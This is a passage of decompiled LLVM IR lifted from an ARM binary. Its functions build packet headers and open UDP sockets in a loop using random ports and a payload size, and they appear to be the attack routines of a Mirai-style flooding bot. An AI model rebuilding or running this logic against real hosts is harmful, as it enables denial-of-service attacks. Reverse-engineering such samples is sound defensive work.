  store i1 %v9_c858, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c858, label %dec_label_pc_c9bc, label %dec_label_pc_c860

dec_label_pc_c860:                                ; preds = %dec_label_pc_c9a8.dec_label_pc_c860_crit_edge, %dec_label_pc_c854
  %v1_c864 = phi i32 [ %v1_c864.pre, %dec_label_pc_c9a8.dec_label_pc_c860_crit_edge ], [ %v1_c858, %dec_label_pc_c854 ]
  store i32 %v5_c458, i32* %r3.global-to-local, align 4
  %v9_c864 = icmp eq i32 %v5_c458, %v1_c864
  store i1 %v9_c864, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c864, label %dec_label_pc_c9d0, label %dec_label_pc_c86c

dec_label_pc_c86c:                                ; preds = %dec_label_pc_c9bc.dec_label_pc_c86c_crit_edge, %dec_label_pc_c860
  %v1_c870 = phi i32 [ %v1_c870.pre, %dec_label_pc_c9bc.dec_label_pc_c86c_crit_edge ], [ %v1_c864, %dec_label_pc_c860 ]
  store i32 %v6_c470, i32* %r0.global-to-local, align 4
  %v9_c870 = icmp eq i32 %v6_c470, %v1_c870
  store i1 %v9_c870, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c870, label %dec_label_pc_c9e4, label %dec_label_pc_c878

dec_label_pc_c878:                                ; preds = %dec_label_pc_c9d0, %dec_label_pc_c86c
  %v0_c878 = load i32, i32* @fp, align 4
  %v2_c878 = icmp eq i32 %v0_c878, 0
  store i1 %v2_c878, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c878, label %dec_label_pc_c880, label %dec_label_pc_c9f4

dec_label_pc_c880:                                ; preds = %dec_label_pc_c878, %dec_label_pc_c9e4, %dec_label_pc_c9f4
  %v2_c884 = load i32, i32* @r5, align 4
  %v3_c884 = add i32 %v2_c884, 10
  %v4_c884 = inttoptr i32 %v3_c884 to i16*
  store i16 0, i16* %v4_c884, align 2
  %v0_c888 = load i32, i32* @r5, align 4
  store i32 %v0_c888, i32* @r0, align 4
  store i32 20, i32* %r1.global-to-local, align 4
  %v2_c890 = call i32 @function_dc98(i32 %v0_c888, i32 20)
  %v3_c890 = trunc i32 %v2_c890 to i16
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_c898 = load i32, i32* @r5, align 4
  %v4_c898 = add i32 %v3_c898, 10
  %v5_c898 = inttoptr i32 %v4_c898 to i16*
  store i16 %v3_c890, i16* %v5_c898, align 2
  %v0_c89c = load i32, i32* @r6, align 4
  store i32 %v0_c89c, i32* @r1, align 4
  %v0_c8a0 = load i32, i32* %r2.global-to-local, align 4
  %v1_c8a0 = trunc i32 %v0_c8a0 to i16
  %v3_c8a0 = add i32 %v0_c89c, 16
  %v4_c8a0 = inttoptr i32 %v3_c8a0 to i16*
  store i16 %v1_c8a0, i16* %v4_c8a0, align 2
  store i32 40, i32* %r3.global-to-local, align 4
  store i32 10240, i32* %r2.global-to-local, align 4
  %v0_c8ac = load i32, i32* @r5, align 4
  store i32 %v0_c8ac, i32* %r0.global-to-local, align 4
  %v4_c8b0 = call i32 @function_dce8(i32 %v0_c8ac, i32 %v0_c89c, i32 10240, i32 40)
  %v5_c8b0 = trunc i32 %v4_c8b0 to i16
  store i32 %v4_c8b0, i32* %r0.global-to-local, align 4
  %v3_c8b4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c8b4, i32* %r3.global-to-local, align 4
  %v3_c8b8 = mul i32 %v3_c8b4, 32
  store i32 %v3_c8b8, i32* %lr.global-to-local, align 4
  %v3_c8bc = load i32, i32* @r6, align 4
  %v4_c8bc = add i32 %v3_c8bc, 16
  %v5_c8bc = inttoptr i32 %v4_c8bc to i16*
  store i16 %v5_c8b0, i16* %v5_c8bc, align 2
  %v0_c8c0 = load i32, i32* %lr.global-to-local, align 4
  %v1_c8c0 = load i32, i32* %r3.global-to-local, align 4
  %tmp68 = mul i32 %v1_c8c0, -8
  %v5_c8c0 = add i32 %v0_c8c0, %tmp68
  store i32 %v5_c8c0, i32* %lr.global-to-local, align 4
  %v0_c8c4 = load i32, i32* @r6, align 4
  %v1_c8c4 = add i32 %v0_c8c4, 2
  %v2_c8c4 = inttoptr i32 %v1_c8c4 to i16*
  %v3_c8c4 = load i16, i16* %v2_c8c4, align 2
  %v1_c8c8 = load i32, i32* @r8, align 4
  %v2_c8c8 = add i32 %v1_c8c8, %v5_c8c0
  store i32 %v2_c8c8, i32* @lr, align 4
  %v3_c8cc = add i32 %v2_c8c8, 2
  %v4_c8cc = inttoptr i32 %v3_c8cc to i16*
  store i16 %v3_c8c4, i16* %v4_c8cc, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_c8d8 = load i32, i32* @r5, align 4
  store i32 %v0_c8d8, i32* %r1.global-to-local, align 4
  %v0_c8dc = load i32, i32* @sl, align 4
  store i32 %v0_c8dc, i32* %r0.global-to-local, align 4
  store i32 60, i32* %r2.global-to-local, align 4
  %v0_c8e4 = load i32, i32* @lr, align 4
  %v6_c8ec = call i32 @function_138bc(i32 %v0_c8dc, i32 %v0_c8d8, i32 60, i32 16384, i32 %v0_c8e4, i32 16)
  %v3_c8f0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c8f0, i32* %r3.global-to-local, align 4
  %v1_c8f4 = add i32 %v3_c8f0, 1
  store i32 %v1_c8f4, i32* %r0.global-to-local, align 4
  %v1_c8f8 = load i32, i32* @r7, align 4
  %v9_c8f8 = icmp eq i32 %v1_c8f4, %v1_c8f8
  store i1 %v9_c8f8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_c8f4, i32* %stack_var_-44, align 4
  %v5_c900 = icmp slt i32 %v1_c8f4, %v1_c8f8
  br i1 %v5_c900, label %dec_label_pc_c808, label %dec_label_pc_c904

dec_label_pc_c904:                                ; preds = %dec_label_pc_c880
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_c908 = icmp eq i32 %v1_c8f8, 0
  store i1 %v2_c908, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_c908, label %dec_label_pc_c7f4, label %dec_label_pc_c804

dec_label_pc_c918:                                ; preds = %dec_label_pc_c808
  %v1_c918 = add i32 %v2_c810, 16
  %v2_c918 = inttoptr i32 %v1_c918 to i32*
  %v3_c918 = load i32, i32* %v2_c918, align 4
  store i32 %v3_c918, i32* %r4.global-to-local, align 4
  %v0_c91c = call i32 @function_f700()
  store i32 %v0_c91c, i32* %r0.global-to-local, align 4
  %v3_c920 = load i32, i32* %stack_var_-44, align 4
  %v5_c928 = mul i32 %v3_c920, 24
  %v0_c92c = load i32, i32* %r4.global-to-local, align 4
  %v1_c92c = and i32 %v0_c92c, 16711680
  %v3_c930 = udiv i32 %v0_c92c, 16777216
  %v4_c934 = udiv i32 %v1_c92c, 256
  %v5_c934 = or i32 %v4_c934, %v3_c930
  store i32 %v5_c934, i32* %r2.global-to-local, align 4
  %v1_c938 = load i32, i32* @r8, align 4
  %v2_c938 = add i32 %v1_c938, %v5_c928
  store i32 %v2_c938, i32* %r1.global-to-local, align 4
  %v1_c93c = and i32 %v0_c92c, 65280
  store i32 %v1_c93c, i32* %r3.global-to-local, align 4
  %v1_c940 = add i32 %v2_c938, 20
  %v2_c940 = inttoptr i32 %v1_c940 to i8*
  %v3_c940 = load i8, i8* %v2_c940, align 1
  %v4_c940 = zext i8 %v3_c940 to i32
  %v5_c948 = call i32 @llvm.bswap.i32(i32 %v0_c92c)
  %v7_c94c = lshr i32 %v0_c91c, %v4_c940
  %v8_c94c = add i32 %v7_c94c, %v5_c948
  store i32 %v8_c94c, i32* %r2.global-to-local, align 4
  %v1_c950 = and i32 %v8_c94c, 16711680
  store i32 %v1_c950, i32* %r0.global-to-local, align 4
  %v1_c95c = and i32 %v8_c94c, 65280
  store i32 %v1_c95c, i32* %r1.global-to-local, align 4
  %v5_c964 = call i32 @llvm.bswap.i32(i32 %v8_c94c)
  %v1_c968 = load i32, i32* @r5, align 4
  %v2_c968 = add i32 %v1_c968, 16
  %v3_c968 = inttoptr i32 %v2_c968 to i32*
  store i32 %v5_c964, i32* %v3_c968, align 4
  store i32 %v6_c51c, i32* %r3.global-to-local, align 4
  store i1 %v8_c970, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_c970, label %dec_label_pc_c978, label %dec_label_pc_c834

dec_label_pc_c978:                                ; preds = %dec_label_pc_c918, %dec_label_pc_c828
  %v0_c978 = call i32 @function_f700()
  store i32 65536, i32* %r4.global-to-local, align 4
  %v1_c980 = load i32, i32* @r5, align 4
  %v2_c980 = add i32 %v1_c980, 12
  %v3_c980 = inttoptr i32 %v2_c980 to i32*
  store i32 %v0_c978, i32* %v3_c980, align 4
  store i32 %v3_c584, i32* %r0.global-to-local, align 4
  %v0_c988 = load i32, i32* %r4.global-to-local, align 4
  %v1_c988 = add i32 %v0_c988, -1
  store i32 %v1_c988, i32* @r4, align 4
  %v9_c98c = icmp eq i32 %v3_c584, %v1_c988
  store i1 %v9_c98c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c98c, label %dec_label_pc_c994, label %dec_label_pc_c848

dec_label_pc_c994:                                ; preds = %dec_label_pc_c978, %dec_label_pc_c834
  %v0_c994 = call i32 @function_f700()
  %v1_c994 = trunc i32 %v0_c994 to i16
  store i32 %v0_c994, i32* %r0.global-to-local, align 4
  store i32 %v3_c588, i32* %r1.global-to-local, align 4
  %v1_c99c = load i32, i32* @r4, align 4
  %v9_c99c = icmp eq i32 %v3_c588, %v1_c99c
  store i1 %v9_c99c, i1* %cpsr_z.global-to-local, align 1
  %v3_c9a0 = load i32, i32* @r5, align 4
  %v4_c9a0 = add i32 %v3_c9a0, 4
  %v5_c9a0 = inttoptr i32 %v4_c9a0 to i16*
  store i16 %v1_c994, i16* %v5_c9a0, align 2
  br i1 %v9_c99c, label %dec_label_pc_c9a8, label %dec_label_pc_c994.dec_label_pc_c854_crit_edge

dec_label_pc_c994.dec_label_pc_c854_crit_edge:    ; preds = %dec_label_pc_c994
  %v1_c858.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c854

dec_label_pc_c9a8:                                ; preds = %dec_label_pc_c994, %dec_label_pc_c848
  %v0_c9a8 = call i32 @function_f700()
  %v1_c9a8 = trunc i32 %v0_c9a8 to i16
  store i32 %v0_c9a8, i32* %r0.global-to-local, align 4
  store i32 %v3_c58c, i32* %r2.global-to-local, align 4
  %v1_c9b0 = load i32, i32* @r4, align 4
  %v9_c9b0 = icmp eq i32 %v3_c58c, %v1_c9b0
  store i1 %v9_c9b0, i1* %cpsr_z.global-to-local, align 1
  %v3_c9b4 = load i32, i32* @r5, align 4
  %v4_c9b4 = add i32 %v3_c9b4, 20
  %v5_c9b4 = inttoptr i32 %v4_c9b4 to i16*
  store i16 %v1_c9a8, i16* %v5_c9b4, align 2
  br i1 %v9_c9b0, label %dec_label_pc_c9bc, label %dec_label_pc_c9a8.dec_label_pc_c860_crit_edge

dec_label_pc_c9a8.dec_label_pc_c860_crit_edge:    ; preds = %dec_label_pc_c9a8
  %v1_c864.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c860

dec_label_pc_c9bc:                                ; preds = %dec_label_pc_c9a8, %dec_label_pc_c854
  %v0_c9bc = call i32 @function_f700()
  %v1_c9bc = trunc i32 %v0_c9bc to i16
  store i32 %v0_c9bc, i32* %r0.global-to-local, align 4
  store i32 %v5_c458, i32* %r3.global-to-local, align 4
  %v1_c9c4 = load i32, i32* @r4, align 4
  %v9_c9c4 = icmp eq i32 %v5_c458, %v1_c9c4
  store i1 %v9_c9c4, i1* %cpsr_z.global-to-local, align 1
  %v3_c9c8 = load i32, i32* @r6, align 4
  %v4_c9c8 = add i32 %v3_c9c8, 2
  %v5_c9c8 = inttoptr i32 %v4_c9c8 to i16*
  store i16 %v1_c9bc, i16* %v5_c9c8, align 2
  br i1 %v9_c9c4, label %dec_label_pc_c9d0, label %dec_label_pc_c9bc.dec_label_pc_c86c_crit_edge

dec_label_pc_c9bc.dec_label_pc_c86c_crit_edge:    ; preds = %dec_label_pc_c9bc
  %v1_c870.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c86c

dec_label_pc_c9d0:                                ; preds = %dec_label_pc_c9bc, %dec_label_pc_c860
  %v0_c9d0 = call i32 @function_f700()
  %v1_c9d4 = load i32, i32* @r6, align 4
  %v2_c9d4 = add i32 %v1_c9d4, 4
  %v3_c9d4 = inttoptr i32 %v2_c9d4 to i32*
  store i32 %v0_c9d0, i32* %v3_c9d4, align 4
  store i32 %v6_c470, i32* %r0.global-to-local, align 4
  %v1_c9dc = load i32, i32* @r4, align 4
  %v9_c9dc = icmp eq i32 %v6_c470, %v1_c9dc
  store i1 %v9_c9dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c9dc, label %dec_label_pc_c9e4, label %dec_label_pc_c878

dec_label_pc_c9e4:                                ; preds = %dec_label_pc_c9d0, %dec_label_pc_c86c
  %v0_c9e4 = call i32 @function_f700()
  store i32 %v0_c9e4, i32* %r0.global-to-local, align 4
  %v0_c9e8 = load i32, i32* @fp, align 4
  %v2_c9e8 = icmp eq i32 %v0_c9e8, 0
  store i1 %v2_c9e8, i1* %cpsr_z.global-to-local, align 1
  %v1_c9ec = load i32, i32* @r6, align 4
  %v2_c9ec = add i32 %v1_c9ec, 8
  %v3_c9ec = inttoptr i32 %v2_c9ec to i32*
  store i32 %v0_c9e4, i32* %v3_c9ec, align 4
  br i1 %v2_c9e8, label %dec_label_pc_c880, label %dec_label_pc_c9f4

dec_label_pc_c9f4:                                ; preds = %dec_label_pc_c878, %dec_label_pc_c9e4
  %v0_c9f4 = call i32 @function_f700()
  %v1_c9f4 = trunc i32 %v0_c9f4 to i16
  store i32 %v0_c9f4, i32* %r0.global-to-local, align 4
  %v3_c9f8 = load i32, i32* @r6, align 4
  %v4_c9f8 = add i32 %v3_c9f8, 18
  %v5_c9f8 = inttoptr i32 %v4_c9f8 to i16*
  store i16 %v1_c9f4, i16* %v5_c9f8, align 2
  br label %dec_label_pc_c880

dec_label_pc_ca00:                                ; preds = %dec_label_pc_c540
  %v0_ca00 = load i32, i32* @sl, align 4
  store i32 %v0_ca00, i32* %r0.global-to-local, align 4
  %v1_ca04 = call i32 @function_1314c(i32 %v0_ca00)
  store i32 %v1_ca04, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ca08

dec_label_pc_ca08:                                ; preds = %dec_label_pc_c36c, %dec_label_pc_ca00
  %v1_ca10 = phi i32 [ %v3_c530, %dec_label_pc_c36c ], [ %v1_ca04, %dec_label_pc_ca00 ]
  store i32 %v3_c36c, i32* %r4.global-to-local, align 4
  store i32 %v24_c36c, i32* %fp.global-to-local, align 4
  store i32 %v27_c36c, i32* %lr.global-to-local, align 4
  ret i32 %v1_ca10

; uselistorder directives
  uselistorder i32 %v0_c9f4, { 1, 0 }
  uselistorder i32 %v0_c9bc, { 1, 0 }
  uselistorder i32 %v0_c9a8, { 1, 0 }
  uselistorder i32 %v0_c994, { 1, 0 }
  uselistorder i32 %v1_c988, { 1, 2, 0 }
  uselistorder i32 %v0_c92c, { 1, 2, 0, 3 }
  uselistorder i32 %v1_c8f4, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_c8c0, { 1, 0 }
  uselistorder i32 %v4_c8b0, { 1, 0 }
  uselistorder i1 %v3_c840, { 1, 0 }
  uselistorder i32 %v2_c7e4, { 1, 0, 2, 3 }
  uselistorder i32 %v0_c64c, { 1, 2, 0 }
  uselistorder i32 %v1_c618, { 2, 1, 0 }
  uselistorder i32 %v1_c614, { 2, 0, 1 }
  uselistorder i32 %v1_c610, { 2, 0, 1 }
  uselistorder i32 %v1_c60c, { 2, 0, 1 }
  uselistorder i32 %v1_c5e8, { 1, 0 }
  uselistorder i32 %v3_c584, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_c578, { 1, 0, 2 }
  uselistorder i32 %v0_c574, { 1, 0, 3, 2 }
  uselistorder i1 %v7_c560, { 1, 0 }
  uselistorder i1 %v7_c534, { 1, 0 }
  uselistorder i32 %v3_c530, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v6_c51c, { 4, 3, 0, 5, 2, 1 }
  uselistorder i32 %v6_c470, { 3, 2, 1, 0 }
  uselistorder i32 %v5_c458, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v6_c3dc, { 1, 0 }
  uselistorder i32 %v7_c3c4, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 16, 13, 14, 15, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 27, 26, 28, 29, 30, 31, 32, 33, 35, 34, 36, 37, 38, 40, 39, 42, 41, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 4, 5, 3, 6, 8, 9, 7, 10, 12, 11, 13, 15, 14, 16, 17, 18, 21, 19, 20, 22, 23, 24, 25, 26, 27, 28, 32, 29, 30, 31, 33, 35, 34, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 0 }
  uselistorder i32 59, { 1, 0 }
  uselistorder i32 45, { 2, 0, 3, 1, 4 }
  uselistorder i32 46, { 2, 0, 3, 1, 4 }
  uselistorder i8 4, { 3, 2, 1, 0 }
  uselistorder i32 42, { 2, 0, 3, 1, 4 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_ca08, { 1, 0 }
  uselistorder label %dec_label_pc_c9f4, { 1, 0 }
  uselistorder label %dec_label_pc_c880, { 2, 1, 0 }
  uselistorder label %dec_label_pc_c804, { 1, 0 }
  uselistorder label %dec_label_pc_c7f4, { 1, 0, 2 }
  uselistorder label %bb61, { 1, 0 }
  uselistorder label %bb59, { 1, 0 }
}

define i32 @function_ca18(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_ca18:
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_ca18 = load i32, i32* @r4, align 4
  %v18_ca18 = load i32, i32* @sb, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg4, i32* @r6, align 4
  store i32 %arg1, i32* @r7, align 4
  %v2_ca34 = call i32 @function_144a8(i32 %arg1, i32 4)
  store i32 %v2_ca34, i32* @sl, align 4
  %v0_ca40 = load i32, i32* @r7, align 4
  %v2_ca44 = call i32 @function_144a8(i32 %v0_ca40, i32 4)
  store i32 65535, i32* @r4, align 4
  %v0_ca50 = load i32, i32* @r6, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 %v2_ca44, i32* @r8, align 4
  %v0_ca60 = load i32, i32* @r5, align 4
  %v4_ca64 = inttoptr i32 %v0_ca50 to i32*
  %v5_ca64 = call i32 @function_a45c(i32 %v0_ca60, i32* %v4_ca64, i32 7, i32 65535)
  %v3_ca6c = urem i32 %v5_ca64, 65536
  %v0_ca70 = load i32, i32* @r6, align 4
  %v0_ca78 = load i32, i32* @r4, align 4
  store i32 %v0_ca78, i32* %r3.global-to-local, align 4
  %v0_ca7c = load i32, i32* @r5, align 4
  %v5_ca84 = inttoptr i32 %v0_ca70 to i32*
  %v6_ca84 = call i32 @function_a45c(i32 %v0_ca7c, i32* %v5_ca84, i32 6, i32 %v0_ca78)
  %v0_ca88 = load i32, i32* @r6, align 4
  %v3_ca8c = mul i32 %v6_ca84, 65536
  store i32 %v3_ca8c, i32* %sb.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  %v0_ca98 = load i32, i32* @r5, align 4
  %v4_ca9c = inttoptr i32 %v0_ca88 to i32*
  %v5_ca9c = call i32 @function_a45c(i32 %v0_ca98, i32* %v4_ca9c, i32 0, i32 512)
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_caac = load i32, i32* @r6, align 4
  %v0_cab0 = load i32, i32* @r5, align 4
  %v3_cab4 = urem i32 %v5_ca9c, 65536
  store i32 %v3_cab4, i32* @r5, align 4
  %v4_cab8 = inttoptr i32 %v0_caac to i32*
  %v5_cab8 = call i32 @function_a45c(i32 %v0_cab0, i32* %v4_cab8, i32 1, i32 1)
  %v0_cabc = load i32, i32* %sb.global-to-local, align 4
  %v3_cabc = udiv i32 %v0_cabc, 65536
  store i32 %v3_cabc, i32* @r6, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_cac4 = load i32, i32* @r4, align 4
  %v9_cac4 = icmp eq i32 %v3_cabc, %v1_cac4
  br i1 %v9_cac4, label %dec_label_pc_caf4, label %bb

bb:                                               ; preds = %dec_label_pc_ca18
  store i32 0, i32* %stack_var_-56, align 4
  %v4_cadc = udiv i32 %v0_cabc, 16777216
  store i32 %v4_cadc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_cb04

dec_label_pc_caf4:                                ; preds = %dec_label_pc_ca18
  store i32 0, i32* %stack_var_-56, align 4
  %v0_caf4 = call i32 @function_f700()
  br label %dec_label_pc_cb04

dec_label_pc_cb04:                                ; preds = %bb, %dec_label_pc_caf4
  %v0_cae810 = urem i32 %v5_cab8, 256
  %v0_cb04 = load i32, i32* @r7, align 4
  %v2_cb04 = icmp eq i32 %v0_cb04, 0
  br i1 %v2_cb04, label %dec_label_pc_cc44, label %dec_label_pc_cb0c

dec_label_pc_cb0c:                                ; preds = %dec_label_pc_cb04
  store i32 0, i32* @sb, align 4
  store i32 0, i32* @fp, align 4
  %v3_cbb8 = udiv i32 %v3_ca6c, 256
  %v1_cbb4 = mul i32 %v5_ca64, 256
  %v4_cbbc = and i32 %v1_cbb4, 65280
  %v5_cbbc = or i32 %v4_cbbc, %v3_cbb8
  %v2_cb3c = ptrtoint i32* %stack_var_-56 to i32
  br label %dec_label_pc_cb9c

dec_label_pc_cb1c:                                ; preds = %bb51, %dec_label_pc_cbdc
  %v3_cb28 = call i32 @function_13940(i32 2, i32 2, i32 17)
  %v7_cb30 = icmp eq i32 %v3_cb28, -1
  %v0_cb34 = load i32, i32* @sb, align 4
  %v1_cb34 = add i32 %v0_cb34, 1
  store i32 %v1_cb34, i32* @sb, align 4
  %v0_cb38 = load i32, i32* @fp, align 4
  %v1_cb38 = add i32 %v0_cb38, 24
  store i32 %v1_cb38, i32* @fp, align 4
  %v2_cb44 = load i32, i32* @r8, align 4
  %v3_cb44 = add i32 %v2_cb44, %stack_var_-60.0
  %v4_cb44 = inttoptr i32 %v3_cb44 to i32*
  store i32 %v3_cb28, i32* %v4_cb44, align 4
  br i1 %v7_cb30, label %dec_label_pc_cc38, label %dec_label_pc_cb4c

dec_label_pc_cb4c:                                ; preds = %dec_label_pc_cb1c
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 2, i32* %stack_var_-56, align 4
  %v3_cb64 = call i32 @function_136f0(i32 %v3_cb28, i32 %v2_cb3c, i32 16)
  %v0_cb68 = load i32, i32* @r6, align 4
  %v1_cb68 = add i32 %v0_cb68, 20
  %v2_cb68 = inttoptr i32 %v1_cb68 to i8*
  %v3_cb68 = load i8, i8* %v2_cb68, align 1
  %v4_cb68 = zext i8 %v3_cb68 to i32
  store i32 %v4_cb68, i32* %r3.global-to-local, align 4
  %tmp = icmp ult i8 %v3_cb68, 32
  br i1 %tmp, label %dec_label_pc_cbf0, label %dec_label_pc_cb74

dec_label_pc_cb74:                                ; preds = %dec_label_pc_cb4c, %dec_label_pc_cbf0
  %v0_cb78 = phi i32 [ %v0_cb68, %dec_label_pc_cb4c ], [ %v0_cb78.pre, %dec_label_pc_cbf0 ]
  %v1_cb7c = load i32, i32* @r8, align 4
  %v2_cb7c = add i32 %v1_cb7c, %stack_var_-60.0
  %v3_cb7c = inttoptr i32 %v2_cb7c to i32*
  %v4_cb7c = load i32, i32* %v3_cb7c, align 4
  %v3_cb84 = call i32 @function_13728(i32 %v4_cb7c, i32 %v0_cb78, i32 16)
  %v0_cb8c = load i32, i32* @sb, align 4
  %v1_cb8c = load i32, i32* @r7, align 4
  %v9_cb8c = icmp eq i32 %v0_cb8c, %v1_cb8c
  %v1_cb90 = add i32 %stack_var_-60.0, 4
  store i32 %v1_cb90, i32* %r3.global-to-local, align 4
  br i1 %v9_cb8c, label %dec_label_pc_cc44, label %dec_label_pc_cb9c

dec_label_pc_cb9c:                                ; preds = %dec_label_pc_cb74, %dec_label_pc_cb0c
  %stack_var_-60.0 = phi i32 [ 0, %dec_label_pc_cb0c ], [ %v1_cb90, %dec_label_pc_cb74 ]
  store i32 65535, i32* @r4, align 4
  %v2_cbac = call i32 @function_144a8(i32 65535, i32 1)
  store i32 %v5_cbbc, i32* %r3.global-to-local, align 4
  %v1_cbc8 = load i32, i32* @r4, align 4
  %v9_cbc8 = icmp eq i32 %v3_ca6c, %v1_cbc8
  %v1_cbcc = load i32, i32* @fp, align 4
  %v2_cbcc = add i32 %v1_cbcc, %arg2
  store i32 %v2_cbcc, i32* @r6, align 4
  %v2_cbd0 = load i32, i32* @sl, align 4
  %v3_cbd0 = add i32 %v2_cbd0, %stack_var_-60.0
  %v4_cbd0 = inttoptr i32 %v3_cbd0 to i32*
  store i32 %v2_cbac, i32* %v4_cbd0, align 4
  br i1 %v9_cbc8, label %dec_label_pc_cbdc, label %bb51

bb51:                                             ; preds = %dec_label_pc_cb9c
  %v1_cbd4 = load i32, i32* %r3.global-to-local, align 4
  %v2_cbd4 = trunc i32 %v1_cbd4 to i16
  %v3_cbd4 = load i32, i32* @r6, align 4
  %v4_cbd4 = add i32 %v3_cbd4, 2
  %v5_cbd4 = inttoptr i32 %v4_cbd4 to i16*
  store i16 %v2_cbd4, i16* %v5_cbd4, align 2
  br label %dec_label_pc_cb1c

dec_label_pc_cbdc:                                ; preds = %dec_label_pc_cb9c
  %v0_cbdc = call i32 @function_f700()
  %v1_cbdc = trunc i32 %v0_cbdc to i16
  %v0_cbe4 = load i32, i32* @fp, align 4
  %v2_cbe4 = add i32 %v0_cbe4, %arg2
  store i32 %v2_cbe4, i32* @r6, align 4
  %v4_cbe8 = add i32 %v2_cbe4, 2
  %v5_cbe8 = inttoptr i32 %v4_cbe8 to i16*
  store i16 %v1_cbdc, i16* %v5_cbe8, align 2
  br label %dec_label_pc_cb1c

dec_label_pc_cbf0:                                ; preds = %dec_label_pc_cb4c
  %v1_cbf0 = add i32 %v0_cb68, 16
  %v2_cbf0 = inttoptr i32 %v1_cbf0 to i32*
  %v3_cbf0 = load i32, i32* %v2_cbf0, align 4
  store i32 %v3_cbf0, i32* %r4.global-to-local, align 4
  %v0_cbf4 = call i32 @function_f700()
  %v1_cc04 = and i32 %v3_cbf0, 65280
  store i32 %v1_cc04, i32* %r3.global-to-local, align 4
  %v0_cc0c = load i32, i32* @r6, align 4
  %v1_cc0c = add i32 %v0_cc0c, 20
  %v2_cc0c = inttoptr i32 %v1_cc0c to i8*
  %v3_cc0c = load i8, i8* %v2_cc0c, align 1
  %v4_cc0c = zext i8 %v3_cc0c to i32
  %v5_cc10 = call i32 @llvm.bswap.i32(i32 %v3_cbf0)
  %v7_cc14 = lshr i32 %v0_cbf4, %v4_cc0c
  %v8_cc14 = add i32 %v7_cc14, %v5_cc10
  %v5_cc2c = call i32 @llvm.bswap.i32(i32 %v8_cc14)
  store i32 %v5_cc2c, i32* %r3.global-to-local, align 4
  %v2_cc30 = add i32 %v0_cc0c, 4
  %v3_cc30 = inttoptr i32 %v2_cc30 to i32*
  store i32 %v5_cc2c, i32* %v3_cc30, align 4
  %v0_cb78.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_cb74

dec_label_pc_cc38:                                ; preds = %dec_label_pc_cb1c
  store i32 %v3_ca18, i32* %r4.global-to-local, align 4
  store i32 %v18_ca18, i32* %sb.global-to-local, align 4
  ret i32 %v3_cb28

dec_label_pc_cc44:                                ; preds = %dec_label_pc_cb74, %dec_label_pc_cb04
  %v1_cc8422 = phi i32 [ 0, %dec_label_pc_cb04 ], [ %v0_cb8c, %dec_label_pc_cb74 ]
  %v2_cc48 = icmp eq i32 %v0_cae810, 0
  br i1 %v2_cc48, label %dec_label_pc_cc68.outer, label %dec_label_pc_cc80

dec_label_pc_cc58:                                ; preds = %dec_label_pc_cc68
  store i32 %v1_cc5c, i32* %r4.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_cc58 = load i32, i32* @r8, align 4
  %v4_cc58 = mul i32 %v1_cc5c, 4
  %v5_cc58 = add i32 %v0_cc58, %v4_cc58
  %v6_cc58 = inttoptr i32 %v5_cc58 to i32*
  %v7_cc58 = load i32, i32* %v6_cc58, align 4
  %v0_cc5c = load i32, i32* @sl, align 4
  %v5_cc5c = add i32 %v0_cc5c, %v4_cc58
  %v6_cc5c = inttoptr i32 %v5_cc5c to i32*
  %v7_cc5c = load i32, i32* %v6_cc5c, align 4
